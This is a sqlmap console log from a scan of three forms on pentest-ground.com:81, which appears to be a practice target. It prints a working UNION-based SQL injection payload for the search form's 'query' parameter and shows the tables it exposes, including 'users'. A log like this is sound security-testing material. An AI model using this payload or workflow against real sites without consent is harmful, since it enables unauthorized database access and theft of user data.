        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:35:15 /2024-05-13/

do you want to check for the existence of site's sitemap(.xml) [y/N] N
[18:35:15] [INFO] starting crawler for target URL 'https://pentest-ground.com:81'
[18:35:15] [INFO] searching for links with depth 1
[18:35:16] [INFO] searching for links with depth 2
please enter number of threads? [Enter for 1 (current)] 1
[18:35:16] [WARNING] running in a single-thread mode. This could take a while
do you want to normalize crawling results [Y/n] Y
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
[18:35:25] [INFO] found a total of 3 targets
[1/3] Form:
POST https://pentest-ground.com:81/login
POST data: username=&password=&remember_me=true
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=&remember_me=true] (Warning: blank fields detected): username=&password=&remember_me=true
do you want to fill blank fields with random values? [Y/n] Y
[18:35:25] [INFO] using '/Users/mahdihussnie/.local/share/sqlmap/output/results-05132024_0635pm.csv' as the CSV results file in multiple targets mode
[18:35:26] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:35:26] [INFO] testing if the target URL content is stable
[18:35:27] [INFO] target URL content is stable
[18:35:27] [INFO] testing if POST parameter 'username' is dynamic
[18:35:27] [WARNING] POST parameter 'username' does not appear to be dynamic
[18:35:28] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[18:35:28] [INFO] testing for SQL injection on POST parameter 'username'
[18:35:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:35:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:35:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:35:34] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:35:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:35:39] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:35:41] [INFO] testing 'Generic inline queries'
[18:35:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:35:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:35:45] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:35:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:35:49] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:35:51] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:35:53] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:35:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:36:00] [WARNING] POST parameter 'username' does not seem to be injectable
[18:36:00] [INFO] testing if POST parameter 'password' is dynamic
[18:36:00] [WARNING] POST parameter 'password' does not appear to be dynamic
[18:36:01] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[18:36:01] [INFO] testing for SQL injection on POST parameter 'password'
[18:36:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:36:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:36:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:36:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:36:09] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:36:11] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:36:13] [INFO] testing 'Generic inline queries'
[18:36:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:36:16] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:36:18] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:36:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:36:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:36:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:36:26] [INFO] testing 'Oracle AND time-based blind'
[18:36:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:36:33] [WARNING] POST parameter 'password' does not seem to be injectable
[18:36:33] [INFO] testing if POST parameter 'remember_me' is dynamic
[18:36:34] [WARNING] POST parameter 'remember_me' does not appear to be dynamic
[18:36:34] [WARNING] heuristic (basic) test shows that POST parameter 'remember_me' might not be injectable
[18:36:34] [INFO] testing for SQL injection on POST parameter 'remember_me'
[18:36:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:36:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:36:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:36:39] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:36:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:36:44] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:36:46] [INFO] testing 'Generic inline queries'
[18:36:46] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:36:48] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:36:50] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:36:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:36:54] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:36:56] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:37:00] [INFO] testing 'Oracle AND time-based blind'
[18:37:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:37:07] [WARNING] POST parameter 'remember_me' does not seem to be injectable
[18:37:07] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[2/3] Form:
POST https://pentest-ground.com:81/create
POST data: title=&content=&reference=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: title=&content=&reference=] (Warning: blank fields detected): title=&content=&reference=
do you want to fill blank fields with random values? [Y/n] Y
[18:37:08] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:37:08] [INFO] testing if the target URL content is stable
[18:37:09] [INFO] target URL content is stable
[18:37:09] [INFO] testing if POST parameter 'title' is dynamic
[18:37:09] [WARNING] POST parameter 'title' does not appear to be dynamic
[18:37:10] [WARNING] heuristic (basic) test shows that POST parameter 'title' might not be injectable
[18:37:10] [INFO] testing for SQL injection on POST parameter 'title'
[18:37:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:37:14] [WARNING] reflective value(s) found and filtering out
[18:37:16] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:37:17] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:37:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:37:21] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:37:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:37:26] [INFO] testing 'Generic inline queries'
[18:37:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:37:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:37:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:37:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:37:39] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:37:42] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:37:44] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:37:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:37:51] [WARNING] POST parameter 'title' does not seem to be injectable
[18:37:51] [INFO] testing if POST parameter 'content' is dynamic
[18:37:51] [WARNING] POST parameter 'content' does not appear to be dynamic
[18:37:51] [WARNING] heuristic (basic) test shows that POST parameter 'content' might not be injectable
[18:37:52] [INFO] testing for SQL injection on POST parameter 'content'
[18:37:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:37:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:37:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:38:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:38:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:38:05] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:38:07] [INFO] testing 'Generic inline queries'
[18:38:08] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:38:10] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:38:21] [INFO] POST parameter 'content' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server/Sybase' extending provided level (1) and risk (1) values? [Y/n] Y
[18:38:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:38:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:38:25] [INFO] checking if the injection point on POST parameter 'content' is a false positive
[18:38:25] [WARNING] false positive or unexploitable injection point detected
[18:38:25] [WARNING] POST parameter 'content' does not seem to be injectable
[18:38:25] [INFO] testing if POST parameter 'reference' is dynamic
[18:38:26] [WARNING] POST parameter 'reference' does not appear to be dynamic
[18:38:27] [WARNING] heuristic (basic) test shows that POST parameter 'reference' might not be injectable
[18:38:27] [INFO] testing for SQL injection on POST parameter 'reference'
[18:38:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:38:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:38:33] [INFO] testing 'Generic inline queries'
[18:38:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:38:39] [WARNING] POST parameter 'reference' does not seem to be injectable
[18:38:39] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[18:38:39] [WARNING] HTTP error codes detected during run:
502 (Bad Gateway) - 2 times
[3/3] Form:
POST https://pentest-ground.com:81/search
POST data: query=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: query=] (Warning: blank fields detected): query=
do you want to fill blank fields with random values? [Y/n] Y
[18:38:39] [INFO] resuming back-end DBMS 'sqlite' 
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: query (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: query=MTWO' UNION ALL SELECT CHAR(113,98,118,106,113)||CHAR(85,110,89,111,100,119,77,72,112,68,84,76,114,67,101,80,98,88,86,113,81,121,108,73,66,102,77,66,106,71,121,111,69,75,103,121,88,81,90,69)||CHAR(113,118,112,98,113),NULL,NULL,NULL,NULL-- Dyhc
---
do you want to exploit this SQL injection? [Y/n] Y
[18:38:40] [INFO] the back-end DBMS is SQLite
web application technology: Nginx 1.25.5
back-end DBMS: SQLite
[18:38:40] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[18:38:40] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[3 tables]
+-----------------+
| posts           |
| sqlite_sequence |
| users           |
+-----------------+

[18:38:40] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/Users/mahdihussnie/.local/share/sqlmap/output/results-05132024_0635pm.csv'

[*] ending @ 18:38:40 /2024-05-13/

